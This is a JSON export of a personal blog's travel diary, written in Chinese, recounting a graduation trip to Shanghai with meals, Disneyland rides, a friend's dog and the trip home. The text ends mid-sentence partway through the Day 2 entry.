[{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/posts/","section":"Blog Posts","summary":"","title":"Blog Posts","type":"posts"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/series/%E4%B8%8A%E6%B5%B7%E7%95%A2%E6%A5%AD%E6%97%85%E8%A1%8C/","section":"Series","summary":"","title":"上海畢業旅行","type":"series"},{"content":"最後一天的行程是蠟像館、步行街買伴手禮然後浦東機場準備回程，也是輕鬆的行程\n早餐：瑞幸咖啡 # 在上海這邊瑞幸咖啡是很大的咖啡連鎖品牌，就像第一天嘗試蜜雪一樣，最後一天也來嘗試看看這邊的大品牌瑞幸咖啡\n生椰拿鐵是比較著名的，算是第一次嘗試這個品項，平常看到生椰應該就不會主動去點，但這次喝完我覺得是好喝的\n一個小插曲是我們一如既往的使用支付寶付款，但不知道為什麼點餐完要付錢卻頻頻報「信息異常」的錯誤，最後是靠店員掃我們才解決（這個問題留到下個篇章談）\nBTW 在這邊跟千璽說聲對不起，一個代言人人形立牌大大的站在瑞幸店裡，但我一直我沒認出來\n早餐的部分再感嘆一下一片韭菜餅 2.5 人民幣，但好好吃，我愛死這裡的物價了\n地鐵站的寄物櫃 # 最後一天扛著行李出來，所以到人民廣場後把行李寄放在地鐵站的置物櫃，遇到的大問題是完全不能寄放，原因不是沒櫃子了，而是實名制的時候一直無法成功，使用護照或台胞證都一樣，我們照慣例是拿支付寶掃 QR code，整個流程上應該是沒有問題的\n後來工作人員的解決方法是一句「用谷歌唄」，倒不是沒想過這個方法，只是不會第一時間想到在這邊用 Google 就是了\nbing 姐說應該是因為臺灣手機號碼的關係，這和早上瑞幸咖啡付款失敗或許是有點關聯的\n杜莎夫人蠟像館 # 最後一天第一個行程是杜莎夫人蠟像館，在人民廣場的新世界大丸百貨裡面，這個行程我是期待的，想像中就是看看蠟像，走完就結束了，但蠟像館設計了很多互動式遊戲，還有服裝 cosplay，簡單來說會是一個拍照聖地，如果認真走完是可以花兩三個小時的\n展區大概分成一開始的紅毯、美妝區、古裝區、三體、盜墓筆記、東西方演藝圈、政治人物、運動員、科學家等等，同時當作認臉挑戰也滿好玩的\n我這才知道原來盜墓筆記真人版是吳磊演的，我找時間去看\n要注意的是門票小貴，有分一般展區和漫威展區，有去漫威那邊需要加價\n很久以前羊肉串 # 午餐是對面百貨公司裡面的很久以前羊肉串，如果是我自己是完全不會進串烤店的，不過串烤店一定有蔬菜這個理由完全說服了我\n這間主打是新疆呼倫貝爾大草原上的羊肉，幾個比較酷的設計來列點寫好了\n店外有自助的飲料和小點心給等待的客人可以先食用，比如說爆米花或是冰水 這是串烤店小白的驚訝點：原來串烤店會提供退熱貼貼在臉上，用來解決火在下面燒額頭很燙的問題，還提供了髮圈，真貼心 這間店的店員會幫忙把食材放到烤架上，也會跟你說多久可以吃，可以吃會再過來幫忙放到上層，所以不要像我一樣覺得好了就拿起來，店員會跑過來跟你說「還沒好喔！請稍等」。沒錯客人要做的除了吃以外就是看烤串在烤架上轉圈圈 結束後有一隻小雪糕可以吃 店外也有一台清淨機會噴大草原的香氣（他們自己寫說一秒帶你到呼倫貝爾大草原，不是我說我），主要是讓客人可以把身上的味道淡化掉，但 Jo 說有可能變成很奇怪的綜合味道就是了 我想特別獨立說的是冷麵好好吃，在大熱天吃微酸的冷麵超級適合的，我回來一定要自己做一碗（冷麵 \u0026raquo;\u0026gt; 涼麵，因為他是清爽的）\n步行街 part 2 # 第二次逛步行街，這次不再是一大早的版本，人潮全部湧現，前一晚夜景人潮和最後一天白天的步行街讓我們知道原來紅綠燈是有用的，在人多的時候大家還是會看那個號誌行動\n最後一天安排步行街主要就是為了伴手禮，加上在蠟像館玩太久，還要注意去機場的時間，有滿多小遺憾的，比如說 Jo 推薦的 Beigel Tree 就只有進去晃一圈，沒有真的品嚐到；MM 旗艦店也是因為在最後一天逛，所以沒有特別裝幾個豆豆，不過 MM 旗艦店真的是一進去就滿滿的甜味，我覺得裡面一定會有很多螞蟻\n人多就是能看到亂源，我們在沈大成買團子時就見識到上海大媽的插隊能力，技能「你不尷尬，尷尬的就是別人」開下去，直接插到櫃檯完全不是問題，雖然 bing 姐表示遇到這種人就要跟他吵，但我不敢，我只是小小的觀光客而已，不用鬧事\n既然提到沈大成了，就順便說說事後吃完的感想，這次主要買了青團、金團、雙釀團、桂花條頭糕這幾個。青團裡面是包豆沙、金團是有黃豆粉、雙釀團是紅豆和 芝麻，外面有椰子粉、桂花條頭糕就是一般條頭糕，但皮是桂花和茉莉綠茶口味的，比起來我最喜歡雙釀團，雖然不知道釀在哪裡，但他好好吃。桂花條頭糕味道滿香的，就是很濃厚的茶味\n[科普時間] ：條頭糕是如懿愛吃的那個甜點 遺憾是沒看到薄荷方糕，而且沒買各種鬆糕，以我們在人潮多的時候去，要買什麼還真多要先想好，到櫃檯還要想感覺櫃檯裡的人和後面等的人都會不耐煩\n離開前找了冰品店休息一下，因為吃的東西看起來很特別所以想來科普，我是點一碗仙草凍水牛奶，可以猜猜看水牛奶是什麼\n好他就是水牛產的奶，我以為是什麼比較水的牛奶還是特別處理過的牛奶，原來斷句是水牛・奶\n回程 # 回程來談談中國的安檢，從地鐵站出來往機場走，按照慣例所有東西都還是得上安檢機器掃一下，辦理出境的規矩和桃園機場也不太一樣，比如說後背包裡面的筆電、行動電源、折疊傘都要拿出來，因為一開始不懂他是大支的雨傘還是折疊傘，所以折疊傘就丟在包包裡面，結果被要求再掃一次，行李掃的同時，人的安檢也很嚴格，我覺得安檢人員可以去行天宮當幫忙收驚的工作人員，那個手法\u0026hellip; 像是進階版的\n在上海的最後幾小時，我和 Jo 買了一瓶青島啤酒等待登機，會講這個是因為我又在耍笨了，真的是啤酒開下去才想到啊等一下暈機藥難道要配啤酒嗎？\n回程搭的是小台的華航，位置比較擠，機位也少了一些，耳機恐只剩一個（這應該跟大小台沒關係），但不知道為什麼，其實我覺得小飛機對耳朵的壓力相對小，去程我覺得機上的聲音滿大的，但回程就還好，不過讓我挑我還是會想搭大台一點的吧！不知道大小台飛機餐有沒有差，個人覺得兩次落差有點大\n","date":"2025-07-11","externalUrl":null,"permalink":"/posts/myfirstshanghai-d5/","section":"Blog Posts","summary":"大學階段的畢業旅行：初飛 X 探親。Day 5 說說回程","title":"上海畢業旅行 - Day 5","type":"posts"},{"content":"","date":"2025-07-11","externalUrl":null,"permalink":"/tags/%E6%97%85%E8%A1%8C/","section":"Tags","summary":"","title":"旅行","type":"tags"},{"content":"轉述 bing 姐的話：這是你們體驗到最上海人的一天\n第四天的規劃是要體驗 bing 姐道地上海人的日常，所以直接到他家作客，順便參觀附近的南翔古鎮\n早餐：張記油條 # 在上海品嚐豆漿油條作為早餐是我期待已久的事，除了本身就喜歡，bing 姐說上海一個菜包兩塊錢，這個物價就算不好吃我也要嘗試（？）\n因為第四天的行程比（非）較（常）鬆散，所以我和 Jo 悠閒的選擇了酒店附近的張記油條作為早餐，算是在附近批發市場外面的一間小店，可以說是附近少數的豆漿店了，不過體驗上並不好，衛生不好以外好像沒什麼讓我驚豔的地方\n這一餐也算是我的鹹豆漿初體驗，雖然說之前就聽過它的名諱，但一直都不太敢嘗試，他們的鹹豆漿並沒有結塊，要結塊應該要點鹹豆花，豆漿的話就像很碎的豆花屑屑飄著，我覺得吃起來很鹹，但 Jo 說這是小巫見大巫，可能長庚那邊的更恐怖？其實我點的是鹹豆漿加一份甜燒餅，想說一甜一鹹可以中和一下，不過老闆給我鹹燒餅，那一餐我覺得我要脫水了\n價位的部分，燒餅 3.5 鹹豆漿 2.5，六塊人民幣吃這樣一頓早餐，還是覺得賺了\n上海公交車 # 去 bing 姐家的路程會需要搭到上海的公交車，這也是我們的初體驗\n跟習慣不一樣的除了上車開乘車碼給他以外，只需要刷上車，下車是直接下去就好。而車上沒有下車鈴，就算沒人上下車司機還是會靠站停一下，某種程度上不用擔心司機不停站直接開走的問題。上海公交車有規定前面上車後面下車，不過我們沒嘗試到客滿很難上下車的情況，說不定這會是前後門分流的 bug\n還有一個很酷的點是他們的路是 車道 | 停靠站 | 機車腳踏車道 | 人行道 |，所以當人要到停靠站時需要先過一個小馬路，這個設計滿好的，因為保障了機車腳踏車的安全，至少不用和一般大車擠來擠去\nbing 姐家養的乖狗狗 # 滿慶幸早在大二去花蓮實習那時，就突破對狗狗的恐懼\n金元寶是 bing 姐家養的一隻狗狗，很乖很聽話，但他的主人一直醜化他，真壞\nbing 姐：你們不要看他這樣，他是很邪惡的 我：（我再怎麼看都覺得你比較... 咳咳咳沒事 根據 bing 姐所說，金元寶對陌生人都會吠一下，熟悉之後就沒事了，一開始很慶幸自己沒被吠（因為我不是站前面的），也很快被金元寶喜歡，想說看來貓緣和狗緣我還是在狗狗這邊比較吃的開，看金元寶會一直盯著我或靠著我睡覺其實滿開心的，結果 bing 姐一句：「金元寶喜歡老男人」讓我不是很開心，其實可以把老字去掉的，22 歲的工程師雖然可以獨立作業但並不老\n來說說金元寶，雖然很乖很聽話，但其實是隻笨狗，那時候拿了一顆新的球給他玩，包裝袋還套著，所以金元寶玩的很盡興，後來他想把袋子拆開，從那刻開始，再也沒有人可以碰到那顆球，連幫忙也不行，就這樣四個人圍著一隻笨狗和一顆球，一直給他鼓勵，一直口頭指導要怎麼有效的把袋子扯開，但那隻小笨狗就只會用牙齒咬而已，咬到自己累了，但旁邊的人都還在，礙於面子又不能妥協，直到最後學會用扯的才成功把袋子拆掉，看著狗狗這樣學習其實成就感滿高的耶！\n成為一名好獵人的訓練課程 # bing 姐說他的日常就是為了成為一名好獵人在做訓練，所以今天也要帶我們體驗魔物獵人一日訓練營，剛好第二天在豫園時他的新武器手柄到貨，這天順便拿給我們玩玩\n就我玩過的遊戲，高中時期比較常玩的就 random dice 這種動腦的塔防（雖然我也沒在動腦），考驗操作的最高層級就元氣騎士這種，為了訓練走位花了我超多時間，因為加了走位等於我從 1D 變 2D，多一個維度多了很多資訊\n上大學開始接觸原神，硬生生被強加了一個維度，那是視角，要自己調整視角，而不像元氣騎士以上帝視角玩 2D 遊戲，到現在或許我也還沒很熟悉攻擊時要走位，還要調整適合的視角，只能瘋狂的轉到適合的位置而已\nbing 姐：看你玩我都暈了 魔物獵人之前沒玩過，一個全新的遊戲還要搭配手柄，那真的是考驗 (for me)。不過我覺得魔物獵人做的真的不錯，尤其是在刻畫每個小角色的動畫和生態的部分，可能這就是魔物獵人的賣點吧！就像原神在賣派蒙元素反應一樣\n到現在 bing 姐還是會在 DC 推薦我們加入獵人的行列，看來一個人的獵人是孤單的\n最後來謝謝 bing 姐請的午餐和上海的第二杯霸王茶姬\n南翔古鎮 # 南翔可能是我們的行程中相對古色古香的景點，類比於郊區的豫園，講到南翔有名的就是饅頭小籠包店\n和豫園不一樣的是南翔河道景色滿美的，但也就是遠景漂漂亮亮，如果走在街道上看到那個 100 分的景配上 0 分的衛很衝突。沒錯，南翔這邊衛生真的滿糟糕的，很像一個很多阿公阿嬤在的大公園\n不過那是我們拍照的南翔，比較多人的那邊，也就是有餐廳的商圈那邊，其實就不會有這個問題，還是回到大都市的氛圍，水道景色依舊\n雖然晚餐選擇了附近的小籠包館吃飯，不過 bing 姐說那不是道地的小籠包\nbing 姐：沒關係，你們沒嘗試到道地的小籠包，但體驗了道地上海人的生活（叫外賣、打遊戲） Previous Nextsads 外灘夜景 # 畢竟是在上海的最後一個晚上，我和 Jo 臨時起意在晚上的時候於朝聖一下眾人激推的外灘夜景\n夜晚的上海跟白天真的不一樣，第二天在外灘一帶沒什麼人，遠眺東方明珠三件套就是建築物的壯觀，夜晚的外灘遊客很多，除了遊客還有想賺觀光財幫忙拍照的攝影師，夜景不僅僅是陸家嘴那邊建築，其實外灘西岸的萬國建築群也很美\n不免俗的吐槽時間：可以不要在黃浦江上的渡輪還放超級大的廣告嗎？真的很煞風景，當我在欣賞夜晚版本的東方明珠時，一個大白兔從下面跑過去非常的奇怪，不過大白兔到底付了多少錢才可以有這種待遇呢？\nLE LABO # 這天還有一個見世面的行程：Jo 帶我去步行街裡面的 LE LABO\nLE LABO 是一個香水品牌，主打，在南京步行街裡面有一間，所以我們進去看看屬於上海的味道\n上海的味道的是末藥 55 ，在西方有神聖的意味，在東方則是中藥的活血劑，有種同時體現出東方和西方、古典和現代並行，正如上海城市一樣\n","date":"2025-07-10","externalUrl":null,"permalink":"/posts/myfirstshanghai-d4/","section":"Blog Posts","summary":"大學階段的畢業旅行：初飛 X 探親。Day 4 說說 bing 姐日常與南翔","title":"上海畢業旅行 - Day 4","type":"posts"},{"content":"五天的行程最肝的一天：上海迪士尼，就像在肝原神一樣\n六點半要出門，搭兩小時的車到迪士尼，玩到 21:30 再準備另一個兩小時回飯店，稍微可以懂為什麼有人花一樣的票價卻願意晚一點到迪士尼早一點離開，背後選擇都是有原因的\n迪士尼雖然是西方的東西，卻沒有抹殺當地文化，比如上海迪士尼以中文版聞名，很出戲和尷尬是真的，但卻某種程度上保留了一些東方痕跡\nStage 0. 入場開錨點 # 我們選擇在八點半前就到迪士尼門口一起進場，一路上需要經過三個傳送錨點，入園、安檢、過票，據說只要人群有在動就該慶幸了，因為在入園時間抵達，所以只花一個小時左右開完三個錨點成功進去（該高興嗎？一小時欸），不說我以為我在風之谷，入園真的像是一坨王蟲過境\n迪士尼的安檢比我想像中還要仔細，每個人都像是機場被掃出可能藏有違禁品的嫌疑犯，包包被一層一層剝開，工作人員拿手電筒邊照邊問「這是什麼」，bing 姐帶了巨人的資料夾就被攔下來兩次，可能是因為怕 bing 姐拿著巨人嚇園區的小朋友吧\nStage 1. 瘋狂動物城：熱力追蹤 # 第一關直奔最裡面的瘋狂動物城：熱力追蹤，這是只有上海迪士尼才有的園區\n雖然排隊排了快一小時，但迪士尼的排隊除了外面曬太陽以外，進到室內就會有互動的子設施，比如說豹警官跟我打招呼，順便冠一個新進警員的身份讓我知道接下來要 cosplay 哪個角色，也經過警局的辦公區更沉浸在情節裡面，透過監獄的對話讓我知道這個設施的目標是要抓到逃跑的壞綿羊，還有脾氣暴躁的牛局長把我們趕上設施，可以說進到室內其實就開始享受了，這大概是迪士尼要排隊很久但大家還願意的其中一個小原因吧！\n整體設施是一個沒有軌道的車子帶著我們追緝壞綿羊，搭配上車速、360° 都可能的移動方向、半圓形劇場螢幕，臨場感很逼真\n不過迪士尼的物價也高到我很害怕，一支 zootopia 的冰棒要價 45 人民幣，甚至還有一個小攤位偷偷漲價賣 65，我要強力抵制！\n在第一關結束前，讓我吐槽一下，其實我覺得臺灣對國外電影翻譯真的做的不錯，印象中翻譯團隊把動物方程式裡面的各個角色盡可能的 map 到真實人物，比如說洪金豹、獅明德、大明星志羚，但上海這邊就很直白的豹警官、牛局長，前期好人後期黑化的羊咩咩市長在這裡直接稱之為壞綿羊，就少了一點鋪陳的感覺，太直白了\nStage 2. 加勒比海盜 - 沉落寶藏之戰 # 第二關還是排隊地獄：加勒比海盜 - 沉落寶藏之戰，有個警語是「可能會濕身」，但不到要穿雨衣的程度。這關排隊時間比較短，但它也是經典關卡，只是比對到晚上六七點的排隊時長看它 20 分鐘就排得到，反觀動物方程式或光輪還要將近兩小時，就知道熱門程度高低了\n加勒比海盜有些人會稱作海盜船，但它跟認知中的海盜船一點關係都沒有，就一樣是乘坐交通工具一路漂流，並沉浸式的和傑克船長一起找寶藏的過程\n至於為什麼會濕身？一開始以為因為他的交通工具是船，它是走水路的，所以會有向下衝刺讓水淹進來，加上當時我坐最邊邊，其實滿緊張的。事實證明不是，中間傑克船長和敵方開打時，有一個橋段是開砲，迪士尼為了模擬砲彈打到水面上的效果，還在水面下放機關讓某幾個位置會有水噴濺上來（好壞），如果迪士尼存心想搞我的話，這一 part 一個不小心真的會全濕，雷鳴山漂流還沒的衣服就濕了，雨衣也用不到了，不過這也是虛驚，迪士尼喜歡搞這種一而再再而三的騙局，在大家都以為水要從下面濺上來的時候，迪士尼讓水從上方噴下來，就是真的噴下來，但量不多，衰的人會全部接下去，才會全濕，不然只會滴到幾滴而已\n除了整個過程和動物方程式一樣讓人驚豔以外，有一個很酷的是迪士尼把加勒比海盜這邊的餐廳放在設施旁邊，簡單來說當遊客搭著海盜船經過在那邊尖叫的時候，另一邊會有人看著你在吃飯，對於吃飯的人來說應該也是一種享受吧！\nStage 3. 雷鳴山漂流 # 第三關是數一數二慘的排隊地獄：雷鳴山漂流，對我們這天就是要在時間內把幾乎所有經典關卡都走過一次。雷鳴山漂流是被強調要穿雨衣會濕的關卡，就連還沒上漂漂船就會被要求要先把雨衣套上，不然可能會被波及，但也是有勇者決心要濕身的啦！在我們前面就有兩個哥哥雨衣都沒穿就上船，給根大拇指\n雷鳴山漂流就是漂漂河，對於這個關卡我非常興奮，主要是以前想玩但沒什麼機會玩（嗯以前畢業旅行去劍湖山我找不到它在哪裡，好笨），好玩是好玩，但體感不如前兩個關卡好，原因是要在大太陽底下玩，雨衣的味道滿臭的，還會遮視線，不是你把我視線遮住我會不知道攻擊從哪裡來啊\n漂流過程一路上會經過幾個上下坡，有一個比較大的是由暗轉明的那個，那時候整船的三批人馬都很剉，怕自己是那個背朝後滑下去的那一位，不過真正該擔心的應該是出入口朝下，一艘船有兩出入個，非常幸運的情況下會是出入口朝下，對應的兩個人就成為守門員，基本上是守不住的，我跟 bing 姐就是那艘船上的幸運兒\nbing 姐：邊關失守啦！陳 B 魚！ 成就解鎖：鞋子襪子濕掉了，謝謝雷鳴山，謝謝迪士尼\n至於濕身的時機，其實整場都會濕喔！所以上了賊船就放棄妥協吧！雖然太陽很大的情況下好像很容易乾，但還是盡可能不要，尤其是鞋子襪子，滿不舒服的。雨衣的話可以事先準備好，園區內其實也會有想賺錢的小販賣雨衣，根據那天的經驗，bing 姐在排隊入園開錨點的期間花 5 塊人民幣，雷鳴山排隊遇到的小販開價會到 10 塊，給個參考可以決定要不要園區內買\n[下船後] 遊客：先生！你身上那件雨衣還要嗎？不要可以給我嗎？我這邊少一件 Stage 4. 風暴來臨：傑克船長之驚天特技大冒險 # 第四關因為我們幾個都筋疲力盡，所以找了一個獎勵關：風暴來臨：傑克船長之驚天特技大冒險，這是迪士尼裡面幾個會有的室內表演，行前功課看迪士尼官網說當天只有遊行和晚上的煙火秀，其他表演都要假日才有，原本以為這場看不到了，結果不知道為什麼當天幾乎所有表演都有開放！\n雖然說是室內、有椅子、有冷氣，不過還是要經過比較短的排隊和進場前的說明開場，迪士尼排隊的人潮沒有很兇，但也是有縫就會鑽，如果有想要挑好位置的人也是要花點心注意一下\n講中文這點還是讓人想吐槽，但其實我滿想嘗試那個最讓人無語的冰雪奇緣：歡唱盛會，有中文版的隨他去聽完不知道是什麼感受\nStage 5. 巴斯光年星際救援 # 第五關是 20 分鐘排隊獎勵關：巴斯光年星際救援，體驗一次獎勵關的甜頭就知道有多好，20 分鐘的概念基本上是一直往裡面走，有八成的時間都在室內參觀關卡前的佈置\n巴斯光年這關算是給小孩玩的，會有一台兩人乘坐的車，可以調整視角方向和兩隻槍，一隻紅色一隻綠色，這關也會同時幫遊客記分，關卡結束似乎會幫忙做排名，把照片貼在外面。滿有趣的是我前面是 Jo 和 bing 姐，後面是一對情侶，簡單說就是我不知道我會怎麼被分配位置，以迪士尼要排隊的立場，浪費一個位置似乎不太好，但要我拆散後面的情侶更不好了，最後迪士尼工作人員讓我一個人乘坐一台，另一個位置給後背包，還記得前面說一台車上有兩隻槍嗎？沒錯，當下我立刻成為全場最帥的雙槍俠，感謝迪士尼讓我有這種尊榮體驗！\nStage 6. 米奇與他的朋友們遊行 # 第六關是下午時段的米奇與他的朋友們遊行，也算是在迪士尼必參加的其中一項行程，聽廣播是說因為天氣因素，米奇童話專列改為米奇與他的朋友們遊行\n天氣因素？就是天氣很熱，也沒下雨啊？那看來是穿玩偶裝的工作人員們中暑了，真的辛苦你們了！\n網路上看到的影片是說遊行會有好幾個路線，只要在想看的路線上堵他們就好，不管是哪一種遊行其實都差不多，讓我比較感興趣的除了動物方程式裡的尼克以外，還有超人特攻隊那幾個主角\n不過嘛。。可能是上海迪士尼的米奇人緣比較不好，說是米奇與他的朋友們，但出來的只有兩車，平常應該是一長串加上一批坐鎮的警衛在前後，結果這一次的遊行就只有兩車，可憐的上海迪士尼，米奇沒朋友了（沒，還是要再一次好好謝謝這些工作人員，大熱天穿玩偶裝跳來跳去真的好辛苦）\nStage 7. 老樹藤餐廳 # 第七關是大獎勵關，晚餐的部分選擇的是仿魔髮奇緣中的小鴨子酒館：老樹藤餐廳，有一部分原因是照顧我這個吃素人\n老樹藤的價位相比園區內其他餐廳並不算高，以我那份醬燒素鴨飯要 89 人民幣，應該是一般樂園餐廳常見的價格，而且迪士尼在食物上的處理並不隨便，說實話是不錯吃的，bing 姐對他那份牛排也是讚不絕口（不過不知道為什麼她要用野蠻人式吃法）\nPrevious Nextsads Stage 8. 迪士尼小鎮 # 第八關我們選擇暫時離開園區，前往迪士尼小鎮找紀念品，算是彌補前一天在旗艦店沒購物的遺憾，迪士尼小鎮就是沒有遊樂設施，把整個場地佈置成真的小鎮的樣貌，有餐廳、有服飾、有紀念品店，不過餐廳服飾店基本上就是中國品牌，比如說中國李寧\n迪士尼小鎮商店 科普時間，因為打遊記時查了才知道：\n中國李寧是中國北京一家體育品牌民營企業，以經營李寧品牌專業及休閒運動鞋、服裝、器材和配件產品為主 我一直以為他是一般服飾店，原來是體育用品\n滿意外的是小鎮還是沒出現木蘭和木須龍，究竟是因為木蘭不討喜還是木蘭已經不是上海迪士尼的賣點了？最後在店裡購入一隻動物方程式的閃電作為來過迪士尼的證明，書包上的 MSI 小恐龍要換樹懶了\n只要當天門票還在，去小鎮是可以再回到園區的，只是一樣需要經過排隊、驗票、安檢幾個流程，小鎮的入口早上也有開放，10 點以後就可以從那邊入園，所以晚到的遊客或許可以選擇這個方向，但會不會比較快就不確定了\nStage 9. 創極速光輪：雪弗蘭呈獻 # 第九關，也是迪士尼的倒數第二關，我們到了上海迪士尼最新的設施：創極速光輪：雪弗蘭呈獻，是源自於創・光速戰記這部迪士尼科幻電影設計的（資料來源：wikipedia），可以說是迪士尼前兩名刺激的設施（另一個是名字和藹可親的抱抱龍雲霄飛車，概念是一個 U 型軌道，有點像海盜船的概念，但來回蕩的次數沒幾次就結束了）\n光輪是電影裡一個競賽的設施，分成紅藍黃三隊，要全隊一起騎乘光輪以最快速度經過八個能量環才算勝利，故事設定我們是藍隊，每個隊伍都有自己的核心理念，但都是中二的東西\n設施是一輛摩托車，遊客會以騎乘重機的方式乘坐（有點半趴在光輪上，靠後面的椅背壓著），如果身上有什麼配件的，可以放在龍頭的一個小匣子，像我的眼鏡，不過那個匣子看起來超級不可靠的，感覺隨便翻一下就會打開東西飛出來\n初始速度就很快了，軌道會從出發區先繞到另一側排隊時看得到的地方進行倒是，大概五秒之後就會衝刺出去找八個能量環，只能說光輪對我而言也是很刺激的設施，網路上是寫過程大約兩分鐘，體感上我不確定，但每個能量環之間的距離並不近，所以像 bing 姐沒在數的就覺得應該結束了，結果光輪還在那邊衝來衝去\n恐懼感除了騎光輪時向下俯衝和超斜的角度，可能還有來自於排隊時聽到慘不忍睹的尖叫聲和等待一個多小時累積的焦慮。可以說這次真的是大突破啊！如果是要找 80 個能量環我可能就扛不住了。也感謝 Jo 和 bing 姐陪我一起突破！\n按照迪士尼設施要排這麼久的陋習，就算排到了想放棄應該也會很嘔吧！迪士尼爸爸媽媽真的是把遊客拿捏住了\nStage 10. 奇夢之光幻影秀 # 第十關，迪士尼晚上定期施放的燈光煙火秀。施放時間是 21:15，通常還沒八點就會有人在那邊排隊找位置，想要有舒服的位置又是要再次經歷排隊等待地獄\n我們滿幸運的在城堡和出口中間的地方就有不錯的位置，前面還有一家三口跟我們坐下來聊天，這是第二次體驗到上海人的熱情\n一家三口的媽媽：唉呦！年輕人就是好，欸這樣就坐下去，再欸一下就爬起來，非常輕鬆 Jo 也在看到妹妹嘗試拍城堡的時候過去給她一個技術指導，這邊給這位熱心的大姐姐一個讚！\n不過不能以為現在坐好好的，等一下大家就會乖乖坐著欣賞煙火秀，完全沒這回事，想要拍照的、沒有好位置的會直接站起來亂竄，基本上只要有一個人站起來，所有人都會跟著起立往前面再靠近一些些\n最後的煙火秀是讓我感嘆的，也是對迪士尼的信服，所有入園的人除了高昂的門票以外，還花了很多時間在排隊等待，也因此迪士尼除了提供遊客期待的設施以外，每場表演、遊行都精心準備，每個晚上放煙火是很燒錢的（雖然他們收了門票還有其他營收），但用這個夢幻的煙火秀為每個來到迪士尼的旅客畫下當天旅程的句點真的很感動\n旅程的終點有一個小提醒：願意留下來看煙火秀的人，也要考慮一下回程的規劃，上海地鐵末班車差不多在 22:30 到 23:00 之間，迪士尼又是一個很偏僻的地方，如果不是在當地住一晚，或是有自己開車，地鐵在考慮轉乘的情況下，要趕搭到末班車著實有一點危險，煙火秀一結束就要瘋狂往外面鑽，也是因為這樣我和 Jo 在徐家匯站解鎖在上海地鐵站解趕倒數第二班末班車成就\n迪士尼 夜間部 一些迪士尼的心得 # 沒有這趟旅程的話，我不會那麼早進入迪士尼。單看門票和那些設施，只會讓我覺得這是大財團的陰謀。經歷這一天的迪士尼行程，好像稍微可以理解為什麼這麼多人願意在這麼高的金錢成本（門票）和時間成本（排隊）下，還願意一訪二訪三訪迪士尼。他們打造了一個在真實世界中很夢幻的地方，盡可能的 1:1 還原迪士尼場景，這對本身就熱愛迪士尼文化的人一定有很大的吸引力\n謝謝上海的迪士尼出現在我現實人生，成為第一座現實生活參訪的迪士尼樂園，一整天雖然很累，腳整個燒起來，但完全感受的到你們歡迎每一位遊客的認真態度，謝謝你\n認真說起來我童年的迪士尼比較偏向 high school musical 或 camp rock 那一類型，不知道有沒有哪個國家的迪士尼有這些園區\n","date":"2025-07-09","externalUrl":null,"permalink":"/posts/myfirstshanghai-d3/","section":"Blog Posts","summary":"大學階段的畢業旅行：初飛 X 探親。Day 3 說說 Disney Land","title":"上海畢業旅行 - Day 3","type":"posts"},{"content":"第一晚其實沒有睡好，可能是因為在陌生的城市、可能是因為認床、可能是因為窗戶關不起來所以一直聽到樓下有兩個阿伯聊天，總之因為這樣我六點爬起來改作業，很抱歉有瘋狂助教在早上 7:30 發公告，打擾大家了 :)\n在開始第二天行程前，來說說之前耍笨的故事。其實這天的下午行程原本要塞米哈遊公司參訪，起因是跟 my bro 聊天時他提到既然都去上海為什麼不要順便去看一下原神的公司，身為有在玩原神的旅行者自然就不會錯過這個機會，於是上網找了好多人參訪的故事，發現不用門票，只要登記就可以進去參觀一樓，即便能看得不多還是覺得這是整趟旅程讓我最接近本科專業的地方，也很開心 Jo 和 bing 姐兩個沒有進入米哈遊教派的人願意花時間跟我一起去朝聖。但為什麼說這是耍笨？因為我沒看清楚開放時間，是假日和國定假日才有開放啊！平日並沒有開放我們這種路人參觀，所以這個插曲就這樣啪不見了\n派蒙：前面的區域，以後再來探索吧！ City Walk - 南京步行街 # 第二天的行程規劃是早八人民廣場集合，在一路從步行街走到豫園、外灘、搭地鐵過去陸家嘴，下午再到田子坊，簡單來說就是類似於行軍的城市旅行，一天的時間看遍上海最經典的景色\n\u0026gt; 插曲：人民廣場一號出口就是個錯誤 [前一天] bing：你們跟我說集合時間地點就好，我會準時出現在那邊，但要講清楚地鐵站哪個出口，因為上海地鐵的出口很多 我：好... 那就約個 8:00 在人民廣場站一號出口好了 [當天] bing：為什麼選一個這麼遠的出口！ 我：我不知道啊！我看高德覺得這邊最棒了！ 不過八點的步行街是個錯誤，因為什麼都沒有，就是百貨公司前的小廣場會看到大媽大叔們在跳廣場舞，也是見識到當地小特色了！\n早餐照計畫是步行街進去滿前面的 Beigel Tree ，但正是因為時間太早了，所以還沒開，連下一間想逛的 M\u0026amp;M 旗艦店 也還沒開，所以給想 city walk 的未來旅客們建議，差不多 10:00 左右在這邊會比較適合，雖然一大早的步行街沒什麼人是真的很開心很舒服，但連店也沒有就很尷尬，不過如果為了沈大成這種排隊名店的話，看準營業時間早點來是好的，第五天的遊記會再提到為什麼\n\u0026gt; 插曲：熱情的上海大姐 [尋找早餐途中] 大姐：你們是外地客吧！在找早餐嗎？說吧！你們想吃什麼？油條？豆漿？生煎？ Jo：呃... 生煎的話呢？ 大姐：生煎吃 !@#$%^ 的，不要吃 !@#$%^\u0026amp; 的，那個是假的不好吃！我在這住久了，外地客都看的出來 接下來是文化衝擊的部分，低消和禁帶外食這件事在上海並不常見。 最後早餐的部分 Jo 在一間店買了粢飯糰，我在另一間店買了煎餅，bing 姐說粢飯糰的店有座位，可以直接待在裡面吃。畢竟我的煎餅是外食，在我的認知裡是覺得帶進去應該會被賣粢飯糰的姐姐瞪吧？不過 bing 姐一再保證不會有這件事發生，也確實姐姐根本沒對我們怎麼樣，還很好心的幫我收垃圾，總之謝謝姐姐！\n走在步行街上，就像 YT 影片說的「排場很大」，放眼望去街道兩側的扛棒都滿大的，螢幕牆的大小和數量也絲毫不遜色，整體就是營造出現代的氛圍，但搭配著歐式老建築的風格，似乎也透露著一點點歷史氛圍。沿路走到外灘，每一段似乎都有代表性的主題，比如說最接近人民廣場那端就是百貨公司林立，也剛好起頭那端就是新世界百貨；中間有一小段會是伴手禮、土產集結的店面，除了上海伴手禮店以外，沈大成、大白兔等也會出現在這一區；再來到 MINISO 那段個人認為集結比較多次文化的元素，除了 MINISO 還有吉伊卡哇快閃店、百聯 ZX 創趣場螢幕牆上甚至一直閃出即將上映的柯南廣告，當然 POP MART 